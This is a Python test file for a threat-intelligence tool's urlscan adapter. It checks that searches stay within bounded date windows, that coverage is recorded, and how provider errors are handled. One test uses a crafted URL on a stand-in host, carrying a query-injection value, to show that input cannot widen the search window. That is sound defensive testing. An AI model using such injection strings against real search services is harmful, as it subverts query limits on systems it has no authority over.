async def test_unusable_account_metadata_never_widens_or_unbounds_a_query(
    months: Any,
) -> None:
    query = await search_query(InvestigationDepth.DEEP, months=months)
    assert query.endswith("date:>now-365d")


async def test_a_deep_forensic_run_uses_the_same_historical_window() -> None:
    """Search broad history; retrieve a tiny bounded set of it."""
    query = await search_query(
        InvestigationDepth.DEEP, months=48, capabilities=FORENSIC_CAPABILITIES
    )
    assert query.endswith("date:>now-1461d")


async def test_a_wider_history_does_not_widen_what_is_retrieved() -> None:
    scans = [f"0195f3c2-4d6e-7a8b-9c0d-1e2f3a4b5c{index:02d}" for index in range(1, 21)]
    results = {scan: payloads.result_payload() for scan in scans}
    retrieved: dict[int, int] = {}
    for months in (6, 120):
        fake = FakeUrlscanClient(
            search_payload=payloads.search_payload(*scans),
            result_payloads=results,
            quotas_payload=quotas_allowing(months),
            dom=DOM_ARTIFACT,
        )
        adapter, _ = make_adapter(fake, artifact_store=InMemoryArtifactStore())
        await adapter.lookup(
            make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
            credential(),
        )
        retrieved[months] = fake.call_count("result")
        assert fake.call_count("dom") == 1
    assert retrieved[6] == retrieved[120] <= 8


async def test_the_search_window_is_recorded_so_a_result_can_be_judged() -> None:
    """ "DEEP found nothing" means one thing over ten years and another over one."""
    fake = FakeUrlscanClient(quotas_payload=quotas_allowing(48))
    adapter, _ = make_adapter(fake)
    envelope = await adapter.lookup(make_request(depth=InvestigationDepth.DEEP), credential())
    coverage = next(
        item for item in envelope.evidence if item.claim_type == "urlscan_search_coverage"
    )
    assert coverage.attributes["depth"] == "deep"
    assert coverage.attributes["historical_range_days"] == 1461
    assert coverage.attributes["historical_range_months"] == 48
    assert coverage.attributes["historical_range_source"] == "provider_limit"
    assert coverage.attributes["max_candidates"] == 8
    assert coverage.attributes["candidates_selected"] >= 1
    assert URLSCAN_HISTORICAL_RANGE_UNKNOWN not in envelope.warnings


async def test_a_fallback_window_is_reported_as_such() -> None:
    adapter, _ = make_adapter()
    envelope = await adapter.lookup(make_request(depth=InvestigationDepth.DEEP), credential())
    coverage = next(
        item for item in envelope.evidence if item.claim_type == "urlscan_search_coverage"
    )
    assert coverage.attributes["historical_range_source"] == "fallback"
    assert "historical_range_months" not in coverage.attributes
    assert URLSCAN_HISTORICAL_RANGE_UNKNOWN in envelope.warnings
    assert envelope.status is ProviderRunStatus.SUCCESS


async def test_coverage_metadata_carries_no_plan_detail() -> None:
    fake = FakeUrlscanClient(quotas_payload=quotas_allowing(48))
    adapter, _ = make_adapter(fake)
    envelope = await adapter.lookup(make_request(depth=InvestigationDepth.DEEP), credential())
    coverage = next(
        item for item in envelope.evidence if item.claim_type == "urlscan_search_coverage"
    )
    assert set(coverage.attributes) <= {
        "depth",
        "historical_range_days",
        "historical_range_months",
        "historical_range_source",
        "page_size",
        "max_candidates",
        "candidates_selected",
    }


async def test_an_ioc_cannot_alter_the_historical_window() -> None:
    """The date bound is generated internally and no value can reach it."""
    fake = FakeUrlscanClient(quotas_payload=quotas_allowing(6))
    adapter, _ = make_adapter(fake)
    hostile = observable(IntelObjectType.URL, 'https://evil.example/?q="OR+date:>now-10y')
    await adapter.lookup(
        make_request(depth=InvestigationDepth.DEEP, intel_object=hostile), credential()
    )
    query = next(detail for name, detail in fake.calls if name == "search")
    assert query.endswith(" AND date:>now-181d")
    assert query.count(" AND date:>") == 1


async def test_quota_is_read_before_the_search_that_depends_on_it() -> None:
    adapter, fake = make_adapter()
    await adapter.lookup(make_request(), credential())
    order = [name for name, _ in fake.calls]
    assert order.index("quotas") < order.index("search")


async def test_a_lookup_still_bounds_its_query_when_quota_is_unavailable() -> None:
    """Unknown is not unbounded."""
    fake = FakeUrlscanClient()
    fake.fail("quotas", ProviderRateLimitedError("urlscan"))
    adapter, _ = make_adapter(fake)
    await adapter.lookup(make_request(depth=InvestigationDepth.DEEP), credential())
    query = next(detail for name, detail in fake.calls if name == "search")
    assert query.endswith("date:>now-365d")


async def test_a_lookup_bounds_its_query_when_quota_is_already_fresh() -> None:
    clock = ManualClock()
    quota_store = InMemoryQuotaStore(clock=clock)
    fake = FakeUrlscanClient()
    adapter = UrlscanAdapter(
        client_factory=FakeUrlscanClientFactory(fake),  # type: ignore[arg-type]
        quota_store=quota_store,
        clock=clock,
    )
    await adapter.lookup(make_request(), credential())
    fake.calls.clear()
    await adapter.lookup(make_request(depth=InvestigationDepth.DEEP), credential())
    assert not fake.called("quotas")
    query = next(detail for name, detail in fake.calls if name == "search")
    assert query.endswith("date:>now-365d")


async def test_an_operator_can_narrow_the_window_further() -> None:
    tuned = SearchLimits(page_size=10, max_candidates=1, max_per_group=1, lookback_days=14)
    adapter, fake = make_adapter(
        lookup_policy=UrlscanLookupPolicy(search_limits={InvestigationDepth.DEEP: tuned})
    )
    await adapter.lookup(make_request(depth=InvestigationDepth.DEEP), credential())
    query = next(detail for name, detail in fake.calls if name == "search")
    assert query.endswith("date:>now-14d")


# --------------------------------------------------------------------------- #
# Only a missing or refused document degrades; a provider failure is raised
# (Task 24 Phase 3)
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "category",
    [
        ProviderErrorCategory.RATE_LIMITED,
        ProviderErrorCategory.QUOTA_EXCEEDED,
        ProviderErrorCategory.AUTHENTICATION_ERROR,
        ProviderErrorCategory.TRANSIENT_ERROR,
        ProviderErrorCategory.PROVIDER_UNAVAILABLE,
    ],
)
async def test_a_provider_failure_on_scan_retrieval_is_raised_not_swallowed(
    category: ProviderErrorCategory,
) -> None:
    """A throttle or a rejected credential is about the provider, not the scan:
    swallowing it kept spending requests, recorded no cooldown, and reported an
    authentication failure as partial coverage."""
    from ti_recon.providers.errors import ProviderError, provider_error_for

    fake = FakeUrlscanClient(search_payload=payloads.search_payload(payloads.SCAN_ID))
    fake.fail("result", provider_error_for(category, "urlscan"))
    adapter, _ = make_adapter(fake)
    with pytest.raises(ProviderError) as raised:
        await adapter.lookup(make_request(), credential())
    assert raised.value.category is category


async def test_a_refused_or_missing_scan_still_degrades() -> None:
    from ti_recon.providers.errors import provider_error_for

    fake = FakeUrlscanClient(search_payload=payloads.search_payload(payloads.SCAN_ID))
    fake.fail("result", provider_error_for(ProviderErrorCategory.PERMISSION_ERROR, "urlscan"))
    adapter, _ = make_adapter(fake)
    envelope = await adapter.lookup(make_request(), credential())
    assert envelope.status is ProviderRunStatus.PARTIAL
    assert URLSCAN_SCAN_UNRETRIEVABLE in envelope.warnings
